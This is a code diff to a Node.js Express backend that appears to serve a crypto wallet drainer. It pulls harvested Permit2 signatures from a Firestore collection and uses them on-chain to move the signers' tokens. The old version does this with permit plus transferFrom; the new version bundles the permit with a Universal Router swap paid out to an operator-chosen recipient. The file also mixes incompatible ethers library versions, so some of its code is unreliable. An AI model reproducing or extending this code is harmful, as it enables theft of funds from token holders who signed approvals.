@@ -1,164 +1,195 @@
+#!/usr/bin/env node
 import dotenv from 'dotenv';
-try { dotenv.config(); } catch (e) {}
+try { dotenv.config(); } catch(e) {}
 
+import express from 'express';
+import cors from 'cors'; // Added CORS for frontend communication
+import bodyParser from 'body-parser';
 import admin from 'firebase-admin';
 import { ethers } from 'ethers';
 
-// Lazy initialization to avoid module-load crashes in serverless envs
+// -----------------------------
+// Configuration
+// -----------------------------
+const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; 
+const UNIVERSAL_ROUTER_ABI = [
+  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
+];
+const COMMANDS = { PERMIT2_PERMIT: 0x02, V3_SWAP_EXACT_IN: 0x08 };
+
+// -----------------------------
+// Globals
+// -----------------------------
 let initialized = false;
 let db = null;
 let provider = null;
 let spenderWallet = null;
-let contract = null;
+let router = null;
 
-const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-
-const ABI = [
-  "function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
-  "function transferFrom(address token, address from, address to, uint160 amount)"
-];
-
+// -----------------------------
+// Init
+// -----------------------------
 async function init() {
   if (initialized) return;
 
-  // Validate required env vars early and return a helpful error
-  const required = [
-    'FIREBASE_PROJECT_ID',
-    'FIREBASE_CLIENT_EMAIL',
-    'FIREBASE_PRIVATE_KEY',
-    'RPC_URL',
-    'SPENDER_PRIVATE_KEY'
-  ];
-
-  const missing = required.filter((k) => !process.env[k]);
-  if (missing.length) {
-    throw new Error('Missing required env vars: ' + missing.join(', '));
-  }
+  const required = ['FIREBASE_PROJECT_ID', 'FIREBASE_CLIENT_EMAIL', 'FIREBASE_PRIVATE_KEY', 'RPC_URL', 'SPENDER_PRIVATE_KEY'];
+  const missing = required.filter(k => !process.env[k]);
+  if (missing.length) throw new Error("Missing env vars: " + missing.join(', '));
 
   const serviceAccount = {
     projectId: process.env.FIREBASE_PROJECT_ID,
     clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
-    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n'),
+    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
   };
 
-  try {
-    if (!admin.apps || admin.apps.length === 0) {
-      admin.initializeApp({
-        credential: admin.credential.cert(serviceAccount),
-      });
-    }
-    db = admin.firestore();
-  } catch (err) {
-    throw new Error('Failed to initialize Firebase Admin: ' + String(err));
+  if (!admin.apps.length) {
+    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
   }
+  db = admin.firestore();
 
-  try {
-    provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
-    spenderWallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY, provider);
-    contract = new ethers.Contract(PERMIT2, ABI, spenderWallet);
-  } catch (err) {
-    throw new Error('Failed to initialize ethers provider/wallet/contract: ' + String(err));
-  }
+  provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
+  spenderWallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY, provider);
+  router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
 
   initialized = true;
 }
 
-async function processPending(limit = 10) {
-  const snaps = await db.collection("permit2_signatures")
-    .where("processed", "==", false)
-    .limit(limit)
-    .get();
-
-  if (snaps.empty) return { processed: 0 };
-
-  let count = 0;
-
-  for (const docSnap of snaps.docs) {
-    const data = docSnap.data();
-    try {
-      // Rebuild signature bytes
-      const fullSig = ethers.concat([
-        data.r,
-        data.s,
-        ethers.toBeHex(data.v)
-      ]);
-
-      // Submit permit
-      const permitTx = await contract.permit(
-        data.owner,
-        {
-          details: {
-            token: data.token,
-            amount: BigInt(data.amount),
-            expiration: data.deadline,
-            nonce: data.nonce
-          },
-          spender: data.spender,
-          sigDeadline: data.deadline
-        },
-        fullSig
-      );
-
-      const permitReceipt = await permitTx.wait();
-
-      // Execute transferFrom
-      const tx = await contract.transferFrom(
-        data.token,
-        data.owner,
-        data.spender,
-        BigInt(data.amount)
-      );
-      const receipt = await tx.wait();
-
-      await docSnap.ref.update({
-        processed: true,
-        permitTx: permitReceipt.transactionHash,
-        transferTx: receipt.transactionHash,
-        processedAt: Date.now()
-      });
-
-      count++;
-    } catch (err) {
-      console.error('run-worker error:', err);
-      try {
-        await docSnap.ref.update({
-          lastError: String(err),
-          lastErrorAt: Date.now()
-        });
-      } catch (uErr) {
-        console.error('failed to record error on doc:', uErr);
-      }
-    }
-  }
-
-  return { processed: count };
+// -----------------------------
+// Tx Builder
+// -----------------------------
+function buildSignatureBytes(r, s, vRaw) {
+  let v = Number(vRaw);
+  if (v === 0 || v === 1) v += 27;
+  const vHex = "0x" + v.toString(16).replace(/^0x/, '');
+  return ethers.hexConcat([r, s, vHex]);
 }
 
-export default async function handler(req, res) {
-  if (req.method !== 'POST' && req.method !== 'GET') {
-    return res.status(405).json({ error: 'Method Not Allowed' });
-  }
+function buildUniversalRouterTx(data, overrides = {}) {
+  const { owner, token, amount, deadline, nonce, r, s, v } = data;
+  
+  // Use frontend overrides or env fallbacks
+  const recipient = overrides.recipient || process.env.SWAP_RECIPIENT || spenderWallet.address;
+  const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
+  
+  const amountBn = BigInt(amount);
+  const signatureBytes = buildSignatureBytes(r, s, v);
+  const permitAbi = new ethers.AbiCoder();
 
+  const permitSingleTuple = [
+    [[token, amountBn, Number(deadline), Number(nonce)], UNIVERSAL_ROUTER, Number(deadline)],
+    signatureBytes
+  ];
+
+  const permitInput = permitAbi.encode(
+    ["address", "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details,address spender,uint256 sigDeadline)", "bytes"],
+    [owner, permitSingleTuple[0], permitSingleTuple[1]]
+  );
+
+  const feeTier = 3000;
+  function encodeFee(f) {
+    let hex = f.toString(16).padStart(6, '0');
+    if (hex.length % 2 === 1) hex = '0' + hex;
+    return '0x' + hex;
+  }
+  const path = ethers.hexConcat([token, encodeFee(feeTier), outputToken]);
+
+  const swapAbi = new ethers.AbiCoder();
+  const swapInput = swapAbi.encode(
+    ["bytes", "uint256", "uint256", "address"],
+    [path, amountBn, BigInt(0), recipient]
+  );
+
+  // Hardcoded command string 0x02 (Permit) + 0x08 (Swap)
+  const commands = "0x0208"; 
+  const inputs = [permitInput, swapInput];
+  const execDeadline = Math.floor(Date.now() / 1000) + 1800;
+
+  return { commands, inputs, execDeadline };
+}
+
+// -----------------------------
+// API
+// -----------------------------
+const app = express();
+app.use(cors()); // Allow frontend to call this
+app.use(bodyParser.json());
+
+app.post('/api/run-worker', async (req, res) => {
   try {
     await init();
-  } catch (err) {
-    console.error('run-worker init error:', err);
-    return res.status(500).json({ ok: false, error: String(err) });
-  }
+    
+    // Determine which docs to process
+    let docsToProcess = [];
+    const { docId, recipient, outputToken } = req.body;
 
-  try {
-    const debug = req.query?.debug === '1' || req.query?.dryRun === '1' || (req.method === 'POST' && req.body && (req.body.debug || req.body.dryRun));
-
-    if (debug) {
-      const snaps = await db.collection('permit2_signatures').where('processed','==',false).limit(20).get();
-      const docs = snaps.docs.map(d => ({ id: d.id, data: d.data() }));
-      return res.status(200).json({ ok: true, processed: 0, unprocessedCount: snaps.size, sample: docs });
+    if (docId) {
+      // 1. Process specific document (from "Execute" button)
+      const docSnap = await db.collection('permit2_signatures').doc(docId).get();
+      if (docSnap.exists && !docSnap.data().processed) {
+        docsToProcess.push(docSnap);
+      }
+    } else {
+      // 2. Process pending queue (fallback)
+      const snaps = await db.collection('permit2_signatures')
+        .where('processed', '==', false)
+        .limit(5)
+        .get();
+      docsToProcess = snaps.docs;
     }
 
-    const result = await processPending(10);
-    return res.status(200).json({ ok: true, ...result });
+    if (docsToProcess.length === 0) {
+      return res.json({ ok: true, processed: 0, message: "No pending docs found" });
+    }
+
+    let processedCount = 0;
+    
+    // Execute Loop
+    for (const docSnap of docsToProcess) {
+      const data = docSnap.data();
+      
+      try {
+        // Build Tx with optional overrides from frontend
+        const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { recipient, outputToken });
+        
+        // Estimate Gas
+        const gasEstimate = await router.execute.estimateGas(commands, inputs, execDeadline, { value: 0 });
+        
+        // Execute
+        const tx = await router.execute(commands, inputs, execDeadline, { 
+          value: 0, 
+          gasLimit: (gasEstimate * 120n) / 100n 
+        });
+        
+        const receipt = await tx.wait();
+
+        await docSnap.ref.update({
+          processed: true,
+          routerTx: receipt.hash,
+          processedAt: Date.now(),
+          adminExecutor: "BACKEND_SERVER"
+        });
+        
+        processedCount++;
+      } catch (err) {
+        console.error(`Error processing ${docSnap.id}:`, err);
+        await docSnap.ref.update({
+          lastError: err.message,
+          lastErrorAt: Date.now()
+        });
+        // If we are processing a single ID request, throw to notify frontend
+        if (docId) throw err; 
+      }
+    }
+
+    res.json({ ok: true, processed: processedCount });
+
   } catch (err) {
-    console.error('run-worker handler error:', err);
-    return res.status(500).json({ ok: false, error: String(err) });
+    console.error("Server Error:", err);
+    res.status(500).json({ ok: false, error: err.message || String(err) });
   }
-}
+});
+
+const port = process.env.PORT || 3000;
+app.listen(port, () => {
+  console.log(`Backend listening on port ${port}`);
+});
